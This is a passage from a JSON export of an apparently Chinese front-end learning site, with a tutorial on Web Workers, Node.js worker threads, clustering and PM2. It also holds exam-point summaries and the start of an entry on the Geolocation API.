工作线程调用`postMessage()`方法将数据发送回主脚本。\n4.  主脚本执行一个`onmessage`事件处理程序来接收结果。\n\n通过这种方式，主脚本和工作线程之间可以进行数据交换和通信，主脚本可以将任务委托给工作线程来并行执行计算密集型的操作。工作线程在完成计算后，将结果发送回主脚本，主脚本可以继续处理返回的结果。\n\n这种消息传递机制使得在Web应用程序中可以实现多线程处理，提高了性能和响应能力，同时避免了阻塞主线程的情况。\n\n![1668257708js-worker-calls.svg](https://static.ecool.fun//article/c29bb265-54b9-4fd7-811a-fa5adfaa0bb4.jpeg)\n\n## Web worker错误处理\n\n现代浏览器的开发者工具支持对Web Worker进行调试和控制台日志输出，就像对任何标准脚本一样。这使得我们可以更方便地调试和监控Web Worker的执行。\n\n此外，主脚本可以随时调用`terminate()`方法来结束工作线程。如果工作线程在特定时间内未响应，这样做可能是必要的。例如，以下代码在工作线程未在十秒内收到响应时终止活动的工作线程：\n\n```js\n// main script\nconst worker = new Worker('./src/worker.js');\n\n// terminate worker after 10 seconds\nconst workerTimer = setTimeout(() => worker.terminate(), 10000);\n\n// worker complete\nworker.onmessage = function(e) {\n\n  // cancel termination\n  clearTimeout(workerTimer);\n\n};\n\n// start worker\nworker.postMessage({ somedata: 1 });\n```\n\n工作线程脚本可以使用标准的错误处理技术，例如验证传入的数据、try-catch-finally块和throw语句，以优雅地处理问题，并在必要时向主脚本报告。\n\n你可以使用以下方式在主脚本中检测未处理的工作线程错误：\n\n-   `onmessageerror`：当工作线程接收到无法反序列化的数据时触发。\n-   `onerror`：当工作线程脚本发生JavaScript错误时触发。\n\n返回的事件对象提供了错误的详细信息，包括`.filename`、`.lineno`和`.message`属性：\n\n```js\nworker.onerror = function(err) {\n  console.log(`${ err.filename }, line ${ err.lineno }: ${ err.message }`);\n}\n```\n\n## 客户端 Web Worker 和 ES 模块\n\n浏览器的 Web Worker 默认不支持 ES 模块（使用 export 和 import 语法的模块）。\n\n在 `src/dice.js` 文件中，定义了一个需要在工作线程中导入的单个函数。由于浏览器的 Web Worker 不支持 ES 模块，因此你不能直接使用 export 和 import 语法将该函数导入到工作线程中。\n\n取而代之的是，你需要使用 `importScripts()` 函数将整个脚本导入到工作线程中：\n\n```js\nimportScripts('./dice.js');\n```\n\n如果你将 `src/dice.js` 的代码包含在 `src/index.js` 脚本中，并且想要在工作线程和非工作线程处理中都使用它，确实可以将其作为 HTML 的 `<script>` 元素加载。\n\n下面是一个示例，展示了如何在 `src/index.js` 模块中将 `src/dice.js` 代码作为 HTML 的 `<script>` 元素加载：\n\n```js\nconst diceScript = document.createElement('script');\ndiceScript.src = './src/dice.js';\ndocument.head.appendChild(diceScript);\n```\n\n在大多数应用程序中，除非需要在主脚本和工作线程脚本之间共享代码库，否则不太可能出现这种情况。\n\n如果你想在工作线程中支持 ES6 模块，确实可以在 worker 构造函数中添加 `{ type: \"module\" }` 参数。以下是一个示例：\n\n```js\nconst worker = new Worker('./src/worker.js', { type: 'module' });\n```\n\n通过使用 `export` 关键字，你可以将 `diceRun()` 函数导出为一个模块，使得其他脚本可以导入并使用它。\n\n```js\nexport function diceRun(runs = 1, dice = 2, sides = 6) {\n  //...\n}\n```\n\n然后，在需要使用 `diceRun()` 函数的地方，可以使用 `import` 语句来导入它。例如，在 `src/worker.js` 中：\n\n```js\nimport { diceRun } from './dice.js';\n```\n\n理论上，ES6 模块是一个很好的选择，但不幸的是，它们只在基于 Chromium 的浏览器中从版本 80 开始（于 2020 年发布）得到支持。你无法在 Firefox 或 Safari 中使用它们，这使得它们对于这里所展示的示例代码来说并不实用。\n\n更好的选择是使用像 esbuild 或 Rollup.js 这样的打包工具。这些工具可以解析 ES 模块的引用，并将它们打包成一个单独的工作线程（和主脚本）JavaScript 文件。这简化了编码过程，并具有让工作线程明显更快的好处，因为它们在执行之前不需要解析导入。\n\n以下是如何使用打包工具来打包工作线程代码的大致概述：\n\n1.  使用你选择的打包工具（如 esbuild 或 Rollup.js）设置项目。\n2.  配置打包工具以处理工作线程代码中的 ES 模块导入。\n3.  使用打包工具构建项目，它会生成一个打包后的 JavaScript 文件。\n4.  在主脚本或 HTML 文件中引用打包后的 JavaScript 文件。\n\n通过打包工作线程代码，你可以克服浏览器环境中 ES6 模块的限制，并确保在不同浏览器中具有更广泛的兼容性。\n\n请参考你选择的特定打包工具的文档，了解如何设置和配置它以打包工作线程代码的更详细说明。\n\n## Client-side service workers\n\n客户端服务工作线程（Client-side service workers）是一种在浏览器中运行的脚本，用于提供离线缓存、推送通知等功能。它们是在 Web Worker 的基础上构建的，主要用于在后台处理一些与用户界面无关的任务。\n\n客户端服务工作线程可以通过拦截网络请求，并缓存和返回响应，来实现离线缓存。这意味着即使用户处于离线状态，他们仍然可以访问之前缓存的资源。此外，客户端服务工作线程还可以用于实现推送通知功能，向用户发送推送消息。\n\n使用客户端服务工作线程的好处包括：\n\n-   离线访问：用户可以在离线状态下访问之前缓存的内容。\n-   快速加载：由于缓存的存在，页面可以更快地加载和呈现。\n-   推送通知：可以向用户发送推送通知，即使用户不在当前打开的网页上。\n\n需要注意的是，客户端服务工作线程仅在支持的浏览器中可用，并且需要使用 HTTPS 协议才能正常工作。此外，使用客户端服务工作线程需要一定的学习和开发成本，因为它们涉及到注册、安装和管理服务工作线程等概念。\n\n总结起来，客户端服务工作线程是一种强大的浏览器功能，可以提供离线访问和推送通知等功能，但使用它们需要考虑浏览器兼容性和一些技术细节。\n\n## 服务端 Web Worker 演示\n\nNode.js 是最常用的服务器端 JavaScript 运行时，自版本 10 起就提供了工作线程（workers）。 然而，Node.js 并不是唯一的服务器端运行时：\n\n-   Deno 复制了 Web Worker API，因此其语法与浏览器代码完全相同。它还提供了兼容模式，可以模拟 Node.js API，如果你想使用该运行时的工作线程语法。\n-   Bun 目前处于测试阶段，虽然打算支持浏览器和 Node.js 的工作线程 API。\n\n此外，你可能会使用像 AWS Lambda、Azure Functions、Google Cloud Functions、Cloudflare Workers、Netlify Edge Functions 等 JavaScript 无服务器服务。这些服务可能提供类似于 Web Worker 的 API，尽管好处较少，因为每个用户请求都会启动一个独立的隔离实例。\n\n以下演示展示了一个 Node.js 进程，每秒将当前时间输出到控制台：\n\n```bash\ntimer process 12:33:18 PM\ntimer process 12:33:19 PM\ntimer process 12:33:20 PM\nNO THREAD CALCULATION STARTED...\n┌─────────┬──────────┐\n│ (index) │  Values  │\n├─────────┼──────────┤\n│    2    │ 2776134  │\n│    3    │ 5556674  │\n│    4    │ 8335819  │\n│    5    │ 11110893 │\n│    6    │ 13887045 │\n│    7    │ 16669114 │\n│    8    │ 13885068 │\n│    9    │ 11112704 │\n│   10    │ 8332503  │\n│   11    │ 5556106  │\n│   12    │ 2777940  │\n└─────────┴──────────┘\nprocessing time: 2961ms\nNO THREAD CALCULATION COMPLETE\n\ntimer process 12:33:24 PM\n```\n\n完成后，相同的计算将在工作线程上启动。在这种情况下，时钟继续运行，同时进行骰子处理：\n\n```bash\nWORKER CALCULATION STARTED...\ntimer process 12:33:27 PM\ntimer process 12:33:28 PM\ntimer process 12:33:29 PM\n┌─────────┬──────────┐\n│ (index) │  Values  │\n├─────────┼──────────┤\n│    2    │ 2778246  │\n│    3    │ 5556129  │\n│    4    │ 8335780  │\n│    5    │ 11114930 │\n│    6    │ 13889458 │\n│    7    │ 16659456 │\n│    8    │ 13889139 │\n│    9    │ 11111219 │\n│   10    │ 8331738  │\n│   11    │ 5556788  │\n│   12    │ 2777117  │\n└─────────┴──────────┘\nprocessing time: 2643ms\nWORKER CALCULATION COMPLETE\n\ntimer process 12:33:30 PM\ntimer process 12:33:31 PM\ntimer process 12:33:32 PM\n```\n\n工作进程通常比主线程快一点。\n\n## 如何使用server-side web worker\n\n这个演示定义了 `src/index.js` 作为主要脚本，当服务器接收到新的 HTTP 请求时，它会启动一个计时器进程（如果它尚未运行）。\n\n```js\n// timer\ntimer = setInterval(() => {\n  console.log(`  timer process ${ intlTime.format(new Date()) }`);\n}, 1000);\n```\n\n`runWorker()` 函数定义了一个 `Worker` 对象，它使用位于 `src/worker.js` 的工作线程脚本的名称（相对于项目根目录）。它将 `workerData` 变量作为一个单一的值传递，该值在这种情况下是一个具有三个属性的对象。\n\n在这个示例中，`workerData` 对象的三个属性是：\n\n-   `start`: 计时器的起始时间，用于计算经过的时间。\n-   `duration`: 计时器的持续时间，即需要计时的时长。\n-   `message`: 在计时完成后发送给主线程的消息。\n\n这些属性可以在 `src/worker.js` 脚本中使用，用于执行计时任务并将结果发送回主线程。\n\n你可以根据自己的需求修改和扩展 `workerData` 对象的属性，以适应更复杂的计时任务或其他工作线程任务。\n\n```js\nconst worker = new Worker(\"./src/worker.js\", {\n  workerData: { throws, dice, sides }\n});\n```\n\n与浏览器的 Web Worker 不同，这里直接启动了脚本，而不需要运行 `worker.postMessage()`。不过你可以使用该方法来运行工作线程中定义的 `parentPort.on(\"message\")` 事件处理程序。\n\n`src/worker.js` 中的代码使用 `workerData` 的值调用 `diceRun()`，并通过 `parentPort.postMessage()` 将结果传递回主线程：\n\n```js\n// worker thread\nimport { workerData, parentPort } from \"node:worker_threads\";\nimport { diceRun } from \"./dice.js\";\n\n// start calculation\nconst stat = diceRun(workerData.throws, workerData.dice, workerData.sides);\n\n// post message to parent script\nparentPort.postMessage(stat);\n```\n\n这将在主要的 `src/index.js` 脚本中触发一个 \"message\" 事件，用于接收结果。\n\n```js\nworker.on(\"message\", result => {\n  console.table(result);\n});\n```\n\n在上述示例中，我们通过 `parentPort.postMessage()` 向主线程发送一个消息，然后调用 `parentPort.close()` 来终止工作线程。这将触发 \"exit\" 事件。\n\n```js\nworker.on(\"exit\", code => {\n  //... clean up\n});\n```\n\n你可以根据需要定义其他错误处理程序和事件处理程序：\n\n-   `messageerror`：当工作线程接收到无法反序列化的数据时触发。\n-   `online`：当工作线程开始执行时触发。\n-   `error`：当工作线程脚本中发生 JavaScript 错误时触发。\n\n## Inline worker scripts\n\n一个脚本文件可以同时包含主线程和工作线程的代码。代码可以使用 `isMainThread` 来检查是否在主线程上运行，然后将自身作为工作线程进行调用（使用 `import.meta.url` 作为 ES 模块中的文件引用，或者使用 CommonJS 中的 `__filename`）。\n\n```js\nimport { Worker, isMainThread, workerData, parentPort } from \"node:worker_threads\";\n\nif (isMainThread) {\n\n  // main thread\n  // create a worker from this script\n  const worker = new Worker(import.meta.url, {\n    workerData: { throws, dice, sides }\n  });\n\n  worker.on(\"message\", msg => {});\n  worker.on(\"exit\", code => {});\n\n}\nelse {\n\n  // worker thread\n  const stat = diceRun(workerData.throws, workerData.dice, workerData.sides);\n  parentPort.postMessage(stat);\n\n}\n```\n\n个人而言，我更倾向于将主线程和工作线程的代码分开放置在不同的文件中，因为它们可能需要不同的模块。内联工作线程可能适用于简单的、只有一个脚本的项目。\n\n将主线程和工作线程的代码分开放置在不同的文件中有助于保持代码的组织和模块化。这样做可以提高代码的可读性、可维护性，并且使不同部分的代码更易于独立开发和测试。\n\n然而，在某些简单的项目中，如果代码库较小且不涉及复杂的模块依赖关系，使用内联工作线程也是一种选择。这可以减少文件数量并简化项目的结构。\n\n总之，个人偏好可以根据项目的特点和需求来决定如何组织主线程和工作线程的代码，无论是将它们分开放在不同文件中，还是使用内联工作线程。\n\n## 服务器端工作线程的限制\n\n服务器端工作线程是一种在服务器端环境中运行的并行执行的 JavaScript 线程。尽管服务器端工作线程提供了并行处理任务的能力，但仍然存在一些限制需要注意。\n\n1.  资源限制：服务器端工作线程在执行期间消耗 CPU、内存和其他系统资源。如果同时执行的工作线程过多或任务过于密集，可能会导致服务器资源不足，影响整体性能。\n2.  安全性限制：由于服务器端工作线程可以执行任意 JavaScript 代码，需要谨慎处理输入数据以防止安全漏洞。特别是当工作线程处理来自不可信源的数据时，必须进行严格的输入验证和过滤，以防止代码注入等攻击。\n3.  文件系统限制：服务器端工作线程可以访问文件系统，但需要小心处理文件操作。在并行执行的环境中，多个工作线程同时访问和修改文件可能导致竞态条件和数据损坏。必要时，应使用同步或异步的文件访问方式，并采取适当的锁定机制来保护共享资源。\n4.  定时器限制：服务器端工作线程可以使用定时器函数（如 `setTimeout` 或 `setInterval`）来执行定时任务。然而，需要注意定时器的资源消耗和精度问题。过多的定时器或过短的时间间隔可能会导致性能问题或不准确的定时器触发。\n5.  线程间通信限制：在服务器端工作线程之间进行通信时，需要小心处理数据传递和同步问题。工作线程之间的消息传递可能会有一定的开销，并且需要注意避免竞态条件和数据不一致性。\n\n## 线程间的数据共享\n\n在线程之间共享数据是多线程编程中的一个常见需求。在服务器端工作线程中，也可以使用一些机制来实现线程间的数据共享。\n\n以下是一些在线程之间共享数据的常见机制：\n\n1.  共享内存：可以使用共享内存来在多个线程之间共享数据。在 Node.js 中，可以使用 SharedArrayBuffer 和 Atomics API 来实现共享内存。通过这种方式，多个线程可以访问和修改同一块内存区域，但需要小心处理并发访问和同步问题，以避免竞态条件和数据不一致性。\n2.  消息传递：另一种常见的方式是使用消息传递来在线程之间传递数据。可以使用 postMessage 方法在主线程和工作线程之间发送消息，并通过监听 message 事件来接收消息。这种方式可以确保数据的安全性，因为每个消息都是独立的，不会存在并发访问的问题。\n3.  共享对象：可以创建一个包含共享数据的对象，并将其传递给不同的线程。不同的线程可以通过引用共享对象来访问和修改数据。然而，需要注意避免并发修改同一共享对象的问题，可以使用互斥锁（例如 Mutex）或其他同步机制来保护共享对象的访问。\n\n在选择合适的数据共享机制时，需要考虑线程安全性、性能、复杂性等因素。根据具体的场景和需求，选择适合的数据共享方式，并确保正确处理并发访问和同步问题，以确保数据的一致性和可靠性。\n\n上面显示的主线程和工作线程之间的通信会导致数据在两个线程之间进行克隆。可以使用表示固定长度原始二进制数据的 SharedArrayBuffer 对象在线程之间共享数据。以下是一个示例代码，主线程定义了从 0 到 99 的 100 个数字元素，并将其发送给工作线程：\n\n```js\nimport { Worker } from \"node:worker_threads\";\n\nconst\n  buffer = new SharedArrayBuffer(100 * Int32Array.BYTES_PER_ELEMENT),\n  value = new Int32Array(buffer);\n\nvalue.forEach((v,i) => value[i] = i);\n\nconst worker = new Worker(\"./worker.js\");\n\nworker.postMessage({ value });\n```\n\nWorker可以接收值对象。\n\n```ini\nimport { parentPort } from 'node:worker_threads';\n\nparentPort.on(\"message\", value => {\n  value[0] = 100;\n});\n```\n\n在这种情况下，无论是主线程还是工作线程都可以更改值数组中的元素，并且在两个线程之间都会发生变化。\n\n这种技术的效率提升有一些好处，因为在任何一个线程中都不需要对数据进行序列化。但也存在一些缺点：\n\n1.  只能共享整数类型的数据，无法直接共享其他类型的数据。\n2.  仍然需要发送消息来指示数据已更改，以便通知其他线程。\n3.  存在两个线程同时更改同一值且失去同步的风险。需要注意并发访问和同步的问题，以避免数据不一致性。\n\n尽管存在这些缺点，但对于需要处理大量图像或其他数据的高性能游戏等场景，这种技术仍然可能带来一些好处。\n\n需要根据具体的应用场景和需求来权衡使用这种技术的利弊，确保在多线程环境下处理数据时保持数据的一致性和正确性。\n\n## Node.js Worker 的替代方案\n\n并非每个 Node.js 应用程序都需要或可以使用工作线程。一个简单的 Web 服务器应用程序可能没有复杂的计算需求。它仍然在单个处理线程上运行，并且随着活跃用户数量的增加，响应性可能会降低。设备可能有更多的处理能力，拥有多个未使用的 CPU 核心。\n\n以下部分描述了一些通用的多线程选项：\n\n1.  Worker Threads（工作线程）：Node.js 提供了 Worker Threads 模块，允许在应用程序中创建额外的工作线程。工作线程可以执行计算密集型任务，或者用于并行处理 I/O 操作。这对于需要处理复杂计算或 I/O 密集型任务的应用程序非常有用。\n2.  Cluster 模块：Cluster 模块是 Node.js 内置的模块，用于创建多个工作进程（而不是线程）以利用多核处理器的能力。每个工作进程都可以独立处理请求，并通过共享端口实现负载均衡。这对于需要处理大量并发请求的 Web 服务器等应用程序非常有用。\n3.  Child Processes（子进程）：Node.js 提供了 Child Processes 模块，允许在应用程序中创建子进程来执行独立的任务。子进程可以与主进程进行通信，并在需要时将结果返回给主进程。这对于需要执行独立任务的应用程序非常有用，例如执行外部命令或运行其他应用程序。\n\n需要根据具体的应用需求和场景选择合适的多线程选项。每种选项都有其适用的场景和优势。使用工作线程、Cluster 模块或子进程，可以充分利用多核处理器的能力，提高应用程序的性能和响应能力。\n\n## Node.js子进程\n\n在 Node.js 中，子进程在工作线程之前得到支持，而且 Deno 和 Bun 都具有类似的功能。实质上，它们可以启动另一个应用程序（不一定是 JavaScript），传递数据并接收结果。它们的操作方式与工作线程类似，但通常效率较低，资源消耗较高。\n\n当你需要运行复杂的 JavaScript 函数时，最好使用工作线程 - 这通常在同一个项目中。而当你需要启动另一个应用程序时，比如 Linux 命令或 Python 脚本，子进程则是必要的。\n\n工作线程适用于在 Node.js 环境中运行的 JavaScript 代码，允许并行执行计算密集型任务或处理 I/O 操作。与主线程共享内存，效率高，适合处理复杂计算或 I/O 密集型任务。\n\n而子进程适用于与其他应用程序进行交互，它们在外部启动并与主进程进行通信。子进程可以启动其他编程语言编写的应用程序或执行系统命令。这对于需要调用其他语言或执行外部命令的情况非常有用。\n\n## Node.js clustering\n\nNode.js 的集群模块允许您派生任意数量的相同进程，以更高效地处理负载。初始主进程可以派生自身 - 可能是根据 os.cpus() 返回的每个 CPU 派生一次。它还可以处理实例失败时的重启，并在派生的进程之间进行通信。\n\n集群标准库提供了一些属性和方法，包括：\n\n-   .isPrimary：对于主要的主进程返回 true（也支持旧的 .isMaster）\n-   .fork()：派生子工作进程\n-   .isWorker：对于工作进程返回 true\n\n以下示例为设备上每个可用的 CPU/核心启动一个 Web 服务器工作进程。一个 4 核的机器将派生四个 Web 服务器实例，以处理多达四倍的处理负载。它还会重新启动任何失败的进程，使应用程序更加健壮：\n\n```js\n// app.js\nimport cluster from 'node:cluster';\nimport process from 'node:process';\nimport { cpus } from 'node:os';\nimport http from 'node:http';\n\nconst cpus = cpus().length;\n\nif (cluster.isPrimary) {\n\n  console.log(`Started primary process: ${ process.pid }`);\n\n  // fork workers\n  for (let i = 0; i < cpus; i++) {\n    cluster.fork();\n  }\n\n  // worker failure event\n  cluster.on('exit', (worker, code, signal) => {\n    console.log(`worker ${ worker.process.pid } failed`);\n    cluster.fork();\n  });\n\n}\nelse {\n\n  // start HTTP server on worker\n  http.createServer((req, res) => {\n\n    res.writeHead(200);\n    res.end('Hello!');\n\n  }).listen(8080);\n\n  console.log(`Started worker process:  ${ process.pid }`);\n\n}\n```\n\n所有进程共享端口 8080，并且任何进程都可以处理传入的 HTTP 请求。运行应用程序时的日志显示如下：\n\n```bash\n$ node app.js\nStarted primary process: 1001\nStarted worker process:  1002\nStarted worker process:  1003\nStarted worker process:  1004\nStarted worker process:  1005\n\n...etc...\n\nworker 1002 failed\nStarted worker process:  1006\n```\n\n很少有 Node.js 开发人员尝试集群。上面的示例很简单并且运行良好，但是当您尝试处理消息、故障和重新启动时，代码可能会变得越来越复杂。\n\n## Process managers\n\n一个 Node.js 进程管理器可以帮助运行多个 Node.js 应用程序实例，而无需手动编写集群代码。其中最著名的是 PM2。以下命令会为每个 CPU/核心启动一个应用程序实例，并在它们失败时进行重启：\n\n```bash\npm2 start ./app.js -i max\n```\n\n应用程序实例在后台启动，因此非常适合在实时服务器上使用。可以通过输入 `pm2 status` 检查哪些进程正在运行（显示了简短的输出）：\n\n```bash\n$ pm2 status\n\n┌────┬──────┬───────────┬─────────┬─────────┬──────┬────────┐\n│ id │ name │ namespace │ version │ mode    │ pid  │ uptime │\n├────┼──────┼───────────┼─────────┼─────────┼──────┼────────┤\n│ 1  │ app  │ default   │ 1.0.0   │ cluster │ 1001 │ 4D     │\n│ 2  │ app  │ default   │ 1.0.0   │ cluster │ 1002 │ 4D     │\n└────┴──────┴───────────┴─────────┴─────────┴──────┴────────┘\n```\n\nPM2 还可以运行用 Deno、Bun、Python 或任何其他语言编写的非 Node.js 应用程序。\n\n## Container Managers\n\n容器管理器（Container Managers）是用于管理和编排容器化应用程序的工具。它们负责在容器集群中部署、扩展和监控容器。\n\n以下是一些常见的容器管理器：\n\n1.  Docker Swarm：Docker Swarm 是 Docker 的原生容器编排和管理工具。它允许您将多个 Docker 主机组成一个集群，并使用 Swarm 调度器在集群中部署和管理容器。\n2.  Kubernetes（K8s）：Kubernetes 是一个开源的容器编排平台，用于自动化部署、扩展和管理容器化应用程序。它提供了强大的容器调度、服务发现、自动伸缩和故障恢复功能。\n3.  Apache Mesos：Apache Mesos 是一个通用的集群管理器，可以有效地共享计算资源并在大规模集群中运行各种工作负载，包括容器化应用程序。Mesos 提供了高度灵活的资源分配和调度机制。\n\n这些容器管理器提供了丰富的功能，如容器调度、自动扩展、服务发现、负载均衡、故障恢复和监控。它们使得在分布式环境中部署和管理容器化应用程序更加简单和可靠。\n\n需要根据具体的需求和场景选择适合的容器管理器，并利用其功能来简化容器化应用程序的管理和运维工作。\n\n## 小结\n\nJavaScript 工作线程可以通过在并行线程中运行 CPU 密集型计算来改善客户端和服务器上的应用程序性能。服务器端的工作线程还可以通过在单独的线程中运行更危险的函数，并在处理时间超过一定限制时终止它们来使应用程序更加健壮。\n\n在 JavaScript 中使用工作线程相对简单，但有一些注意事项：\n\n-   工作线程无法访问所有的 API，例如浏览器的 DOM。它们最适合用于长时间运行的计算任务。\n-   对于密集但异步的 I/O 任务，例如 HTTP 请求和数据库查询，工作线程的必要性较低。\n-   启动一个工作线程会有一定的开销，因此可能需要一些实验来确保它们能改善性能。\n-   与服务器端多线程相比，一些选项如进程和容器管理可能是更好的选择。\n\n尽管如此，当遇到性能问题时，工作线程是一个值得考虑的有用工具。",
    "testPoint": "### 1. **Web Workers 的基本概念**\n   - **定义**：Web Workers 是运行在后台的独立线程，允许在不阻塞主线程的情况下执行脚本代码。\n   - **类型**：常见的有 **Dedicated Workers**（专用 Workers，单页面使用）和 **Shared Workers**（共享 Workers，多个页面或同源脚本共享）。\n\n### 2. **如何创建和使用 Web Worker**\n   - **Worker 创建**：\n     - 通过 `new Worker()` 创建 Worker 线程，传入一个 JavaScript 文件的路径作为参数。\n     ```javascript\n     const worker = new Worker('worker.js');\n     ```\n   - **消息通信**：\n     - 主线程通过 `postMessage()` 向 Worker 发送消息，Worker 通过 `onmessage` 事件处理消息并返回处理结果：\n     ```javascript\n     // 主线程\n     worker.postMessage('Hello Worker!');\n     worker.onmessage = function(event) {\n         console.log('Received from worker:', event.data);\n     };\n\n     // worker.js\n     self.onmessage = function(event) {\n         console.log('Received from main thread:', event.data);\n         self.postMessage('Message received');\n     };\n     ```\n\n### 3. **Web Workers 的特性**\n   - **异步执行**：Web Workers 运行在独立线程中，与主线程并行，不会阻塞主线程的 UI 渲染或事件处理。\n   - **不共享上下文**：Worker 没有访问 DOM、window、document 等浏览器对象的权限，运行在独立的全局作用域中（`self` 对象）。\n   - **通信机制**：主线程与 Worker 通过 `postMessage()` 传递消息，消息是通过串行化传递的，数据不会共享，而是复制。\n   - **支持的 API**：Worker 支持的 API 有 `XMLHttpRequest`、`fetch`、`setTimeout`、`setInterval`、`WebSockets`、`importScripts()`，但不支持 DOM 操作。\n\n### 4. **Web Workers 的使用场景**\n   - **CPU 密集型任务**：如复杂的数学计算、大量数据处理、图片和视频处理等，可以放到 Worker 中执行，避免主线程被阻塞。\n   - **异步数据处理**：如后台处理 API 响应、大型 JSON 解析、加密解密等任务，保证 UI 的流畅性。\n   - **离线应用中的数据同步**：通过 Web Workers 处理离线数据的同步与缓存，保证数据一致性。\n\n### 5. **Web Workers 与多线程的区别**\n   - **Worker 是单线程的**：每个 Web Worker 是独立的单线程，多个 Worker 可以并行执行任务，但 Worker 本身并没有真正的多线程能力（不会共享状态）。\n   - **多 Worker 协作**：可以通过创建多个 Worker 实现伪多线程，通过消息传递共享数据。\n\n### 6. **Shared Worker 的特点**\n   - **共享 Worker 线程**：不同的浏览器窗口、iframe 等在同一页面中可以共享一个 Worker 线程，适用于跨多个页面协作的场景。\n   - **通信方式**：与专用 Worker 类似，但不同页面之间可以通过 `MessagePort` 进行通信。\n\n### 7. **Worker 中的错误处理**\n   - **主线程错误处理**：主线程可以通过 `onerror` 事件捕获 Worker 中的错误。\n   ```javascript\n   worker.onerror = function(error) {\n       console.log('Error in worker:', error.message);\n   };\n   ```\n   - **Worker 内的错误捕获**：Worker 内部可以使用 try-catch 捕获代码执行中的错误。\n\n### 8. **Web Workers 的生命周期管理**\n   - **终止 Worker**：可以通过 `terminate()` 方法在主线程中手动终止 Worker。\n   ```javascript\n   worker.terminate();\n   ```\n   - **自动销毁**：Worker 执行完成后不会自动销毁，仍然可以保持活跃等待进一步的消息，因此需要手动管理 Worker 的生命周期以释放资源。\n\n### 9. **Web Workers 的性能优化**\n   - **线程开销**：创建 Worker 线程有一定的开销，过多的 Worker 可能会增加性能负担，尤其是在短时间内频繁创建和销毁 Worker 的场景。\n   - **消息传递的成本**：由于消息是通过拷贝传递的，大量数据传递会带来性能开销。可以通过使用 **Transferable Objects** 来优化数据传输。\n\n### 10. **Transferable Objects**\n   - **特点**：Transferable Objects 允许直接将数据的所有权转移给 Worker，而不是复制数据。常用于 ArrayBuffer 等大数据传输的场景，提升性能。\n   ```javascript\n   let buffer = new ArrayBuffer(1024);\n   worker.postMessage(buffer, [buffer]);\n   ```\n\n### 11. **Service Workers 与 Web Workers 的区别**\n   - **作用不同**：Web Workers 用于在后台执行计算密集型任务，主要是数据处理；Service Workers 则用于控制网络请求、缓存管理、离线支持等。\n   - **生命周期不同**：Service Workers 在用户首次访问页面时注册后一直存在，即使关闭页面也能继续运行；而 Web Workers 只在页面活跃时存在。\n\n### 12. **Web Workers 的兼容性**\n   - 需要了解 Web Workers 在不同浏览器中的兼容性，尤其是在移动端或旧版本浏览器中的支持情况。\n\n### 13. **Worker 线程中的模块化脚本加载**\n   - **importScripts()**：Web Workers 支持使用 `importScripts()` 同步加载外部脚本，考察点可能包括如何使用该方法来分割代码或动态加载代码。\n   ```javascript\n   importScripts('script1.js', 'script2.js');\n   ```\n\n### 14. **Worker 内的 API 支持**\n   - **支持的 API**：如 Web Workers 支持的部分 API（如 `fetch`、`WebSockets`、`setTimeout`、`XMLHttpRequest`），如何在 Worker 内使用这些 API。\n   - **不支持的 API**：如 DOM 操作、`alert()` 等不支持的操作，考察点可能包括 Worker 的使用限制。",
    "exerciseKeyList": "[\"9ae6ebb4-5aae-4a1b-b0e8-15e1b12bc178\",\"f18218c8-4c74-4631-b66d-e7ac65929f35\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 15,
    "createAt": "2024-10-16T11:58:18.000Z",
    "updateAt": "2024-11-06T06:12:54.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "9ae6ebb4-5aae-4a1b-b0e8-15e1b12bc178",
        "title": "Web Worker 是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-28T02:55:47.000Z",
        "updateAt": "2024-08-10T17:07:25.000Z"
      },
      {
        "exerciseKey": "f18218c8-4c74-4631-b66d-e7ac65929f35",
        "title": "WebWorker、SharedWorker 和 ServiceWorker 有哪些区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T23:23:12.000Z"
      }
    ]
  },
  "140": {
    "id": 140,
    "tagId": 12,
    "title": "地理定位",
    "explanation": "HTML5 提供了地理定位（Geolocation）API，用于获取用户的当前位置。通过这一功能，网页可以访问用户的地理位置信息，进而实现如地图服务、定位推荐、基于位置的广告等功能。该 API 主要依赖设备的 GPS、Wi-Fi、IP 地址、蓝牙等信息来确定位置。\n\n### **Geolocation API 的基本用法**\n主要通过 `navigator.geolocation` 对象来访问地理位置信息，提供了以下三个方法：\n\n1. **`getCurrentPosition(success, error, options)`**\n   获取用户的当前位置，一次性返回位置信息。\n   \n2. **`watchPosition(success, error, options)`**\n   持续监听用户的位置变化，并且实时返回新的位置信息。\n\n3. **`clearWatch(id)`**\n   取消 `watchPosition` 监听的位置变化。\n\n### **方法的参数说明**\n- `success(position)`：成功获取位置时的回调函数。`position` 对象包含位置信息，如经度、纬度、速度等。\n- `error(error)`：可选参数，获取位置失败时的回调函数。`error` 对象包含错误信息，如用户拒绝提供位置或获取超时等。\n- `options`：可选参数，包含配置选项，影响获取位置的精度、超时时间等。\n\n### **使用示例**\n\n```javascript\nif (navigator.geolocation) {\n  navigator.geolocation.getCurrentPosition(\n    (position) => {\n      const latitude = position.coords.latitude;\n      const longitude = position.coords.longitude;\n      console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);\n    },\n    (error) => {\n      console.error(`Error Code = ${error.code}: ${error.message}`);\n    },\n    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }\n  );\n} else {\n  console.log(\"Geolocation is not supported by this browser.\");\n}\n```\n\n### **获取到的 `position` 对象**\n`position` 对象包含用户的位置信息，主要属性包括：\n- `coords.latitude`: 纬度\n- `coords.longitude`: 经度\n- `coords.altitude`: 海拔（如果可用）\n- `coords.accuracy`: 经度和纬度的精度，单位是米\n- `coords.altitudeAccuracy`: 海拔的精度（如果可用）\n- `coords.heading`: 前进方向，以角度为单位（0°表示北，90°表示东）\n- `coords.speed`: 速度，单位为米每秒\n- `timestamp`: 获取位置信息的时间戳\n\n### **示例：持续监听位置变化**\n\n```javascript\nconst watchId = navigator.geolocation.watchPosition(\n  (position) => {\n    console.log(`New position: ${position.coords.latitude}, ${position.coords.longitude}`);\n  },\n  (error) => {\n    console.error(`Error: ${error.message}`);\n  }\n);\n\n// 停止监听\nnavigator.geolocation.clearWatch(watchId);\n```\n\n### **安全和隐私**\n由于地理定位信息属于敏感信息，出于隐私保护的考虑，浏览器会在首次调用定位功能时提示用户是否允许网页访问位置。如果用户拒绝，错误回调会被触发。\n\n### **兼容性**\nGeolocation API 是 HTML5 